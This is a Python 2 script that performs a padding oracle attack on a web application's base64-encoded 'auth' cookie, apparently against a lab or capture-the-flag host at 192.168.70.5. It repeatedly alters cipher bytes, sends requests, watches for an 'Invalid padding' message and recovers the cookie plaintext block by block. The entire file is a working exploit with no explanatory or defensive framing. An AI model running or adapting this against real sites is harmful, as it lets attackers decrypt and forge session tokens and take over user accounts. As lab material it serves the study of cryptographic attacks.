import requests
import base64
import urllib
import re
import sys
import md5

requests.packages.urllib3.disable_warnings()


BS = 8

def send(value):
	value = base64.b64encode(value)
	value = urllib.quote(value)
	burp0_url = "http://192.168.70.5:80/index.php"
	burp0_cookies = {"auth": value}
	proxies = {'http' : '192.168.70.1:8090',
				'https' : '192.168.70.1:8090'}
	burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-GB,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://192.168.70.5/login.php", "Connection": "close", "Upgrade-Insecure-Requests": "1"}

	response = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).text
	bad_pad = "Invalid padding"
	if bad_pad in response:
		return 1
	else:
		return 0

def decode(value):
    value = base64.b64decode(value)
    return value


user_cookie = decode("")

def makeArray(string, blocksize):
    #string = base64.b64decode(string)
    array = []
    for i in range(0, len(string)/blocksize):
        block = string[blocksize*i:blocksize*(i+1)]
        array.append(block)
    return array

def makeHash(string):
    m = md5.new()
    m.update(string)
    return m.hexdigest()

def def_padding():
    error = 0
    pos = len(user_cookie)-BS*2
    s = list(user_cookie)
    while error == 0:
        s[pos] = "A"
        to_send = "".join(s)
        error = send(to_send)
        if error == 1:
            print "PADDING LENGTH: ", len(s)-pos-BS
            pad = len(s)-pos-BS
            return pad
        else:
            pos += 1

def fhex(value):
    new = hex(value).split('x')[-1]
    return new

def hack_pad():
    default = def_padding()
    plaintext = ""
    blocks = makeArray(user_cookie, BS)
    org_length = len(blocks)
    for c in range(0,org_length-1):
        print blocks
        intermediates = {}
        print "ROOOOUND", str(c)
        print "ALL BLOCKS: ", blocks
        first = True
        n = org_length - c - 1
        cipher_block = blocks[n-1]
        cipher_block_content = list(cipher_block)

        for z in range(1,BS+1):
            pos = BS - z
            org_byte = ord(list(cipher_block)[pos])
            for b in range(256):
                if b == org_byte:
                    if default != z:
                        continue
                cipher_block_content[pos] = chr(b)
                cipher_block_mod = "".join(cipher_block_content)
                blocks_tmp = blocks[:]
                blocks_tmp[n-1] = cipher_block_mod
                data = ''.join(blocks_tmp)
                print "SENDING: ", blocks_tmp
                result = send(data)
                if result == 0:
                    intermediate = b ^ z
                    intermediates[pos] = intermediate
                    plain = org_byte ^ intermediate
                    plaintext += chr(plain)
                    next_pad = z+1
                    cipher_block_content[pos] = chr(intermediate ^ next_pad)
                    kk = 0
                    if first != True:
                        while kk < len(intermediates)-1:
                            kk += 1
                            cipher_block_content[pos+kk] = chr(intermediates[pos+kk] ^ next_pad)

                    first = False
                    break
                if b == 255:
                    sys.exit()
        blocks.pop(len(blocks)-1)
        print plaintext[::-1]
hack_pad()
